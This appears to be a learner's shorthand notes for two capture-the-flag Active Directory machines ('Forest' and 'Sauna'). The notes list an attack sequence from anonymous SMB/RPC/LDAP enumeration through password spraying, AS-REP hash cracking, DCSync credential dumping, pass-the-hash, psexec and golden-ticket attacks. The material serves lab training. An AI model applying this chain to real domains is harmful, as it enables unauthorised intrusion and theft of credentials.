no cred. FOREST
```bash
1- check smbclient
2- check dns (hostname may be leaked) 
	nslookup > server ip > 127.0.0.1
	
3- win ttl = 127 or 128 vs linux ttl = 64 
4- ldapseacrh -x(simple-auth) -h #ip-dc -s(scope) 
   namingcontext -b(base) "DC=,DC=" > OUT-LDAP.txt
   $ cat OUT-LDAP.txt | grep -i memberof , cn= , user
    ,etc 

5- ldap-query >ldapseacrh -h ip -x -b "DC=,DC="
'(query)' sAMAccountName sAMAccountType
https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7 

6- Using CrackMapExec to dump the password policy of       Active Directory using a null authentication.
	https://github.com/seriotonctf/cme-nxc-cheat-sheet
	we search for ('account lockout threshold ?')
7- enum4linux(written in purl)

8- rpcclient -U '' -P '' #IP ,> enumdomusers .(duoble   tab to check built in commands) , in rpc you should specify the rid , check queryusergroups 0xrid,then check the rid of groups appears.

9- userslist.txt is ready 

10- crackmapexec smb ip -u userlist.txt -p pwlist.txt !!avoid

11- go to impacket (https://tools.thehacker.recipes/impacket/examples/getnpusers.py) examples 'GetNPUsers.py' for users who dont requere for kerberos preauth > crack hash 

12- crackmapexec smb #ip -u user -p passwgreord --shares

13- port 5985 , 47001 <> winrm ,vie cred use evil-winrm

14- userpwnd, always run winpeas.exe

15- run sharphound with bloodghound

16- check paths, DCsync attacks , add user , assign it to group via powerview

17- use secretdump.py via valid cred

18- use crackmapexec smb ip -u admin -H hash . ?pwn3d!

19- use psexec.py, winexec.py

20- golden ticket attack ,from kali or mimikatz > u need domain SID , krbtg hash
```


![[Pasted image 20241111141011.png]]
no cred. sauna
```bash
1- crackmapexec smb #ip 
2- crackmapexec smb #ip -u '' -p '' --shares
3- rpclient #ip -U '' -P ''
4- WEB SERVER (CHECK FOR USERS CRED )
5- in url , ip/index.phpx or aspx/asp or html
6- burp suit ??


7- **** if no cred found ***** , kerbrute tool to check username spray check-auth


8- look for python scripts that shuffle usernames before kerbrute

9-if user found <> GetNPUsers.py <> add the domain to dns < sudo nano /etc/hosts , ip domain 

10- run  GetNPUsers.py
11- hashcat , crack the asrep , using mode 18200
12- pwned ?
13- run crackmapexec using the valid cred + --shares ?
14- if some share is suspecious try run searchspliot against it 
15- run evil-winrm
16- in victem machine run upload winpeas.exe
17-run
18-new cred for other user revealed ?
19- run ./secretdump.py (dc sync attack possible with the new cred how becuase the new account has priv to sync all users from the master domain controler why? because it like the account is entering the domain and want to sync all passwords(send allm hashes))
20- pass the hash via crackmapexec smb 
21- now you can run psexec.py as administrator (with lan man hash and ntlm or ntlm alone !!)
22- compromised

```



no cred. active
```bash


```